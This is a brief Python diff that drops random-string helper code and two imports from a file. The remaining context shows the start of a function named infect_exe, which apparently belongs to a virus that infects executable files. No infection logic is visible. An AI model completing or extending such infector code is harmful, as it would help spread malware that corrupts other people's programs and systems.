@@ -1,13 +1,8 @@
 import os
-import random
 import time
-import string
 import sys
 import shutil
 import pyautogui as autogui
-def generate_random_string(length):
-    letters = string.ascii_letters
-    return ''.join(random.choice(letters) for i in range(length))
 
 def infect_exe(file_path, executable_path):
     try:
